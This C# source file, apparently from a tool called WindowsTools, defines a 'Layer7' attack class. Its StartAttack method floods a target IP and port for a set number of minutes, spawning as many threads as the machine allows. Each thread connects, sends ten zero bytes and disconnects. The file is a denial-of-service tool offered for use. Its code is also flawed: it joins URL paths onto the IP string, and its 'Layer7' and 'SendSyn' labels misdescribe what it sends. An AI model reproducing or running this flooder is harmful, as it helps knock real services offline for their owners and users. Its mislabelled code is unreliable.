using System;
using System.Net.Sockets;
using System.Threading;
using WindowsTools.utils;

namespace WindowsTools.attacks
{
    public class Layer7
    {
        private static readonly int MaxThreads = SystemResources.CalculateMaxThreads();
        private static int _runningThreads;

        public static void StartAttack(string ip, int port, string[] paths, int executionMinutes)
        {
            var rand = new Random();
            var endTime = DateTime.Now.AddMinutes(executionMinutes);

            try
            {
                while (DateTime.Now < endTime)
                {
                    if (_runningThreads < MaxThreads)
                    {
                        var randomIndex = rand.Next(0, paths.Length);

                        var thread = new Thread(() =>
                        {
                            Interlocked.Increment(ref _runningThreads);
                            SendSyn(ip + paths[randomIndex], port);
                            Interlocked.Decrement(ref _runningThreads);
                        });

                        thread.Start();
                    }
                    else
                    {
                        Thread.Sleep(100);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
        }

        private static void SendSyn(string targetIp, int targetPort)
        {
            try
            {
                var socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                socket.Connect(targetIp, targetPort);
                socket.Send(new byte[10]);
                socket.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
        }
    }
}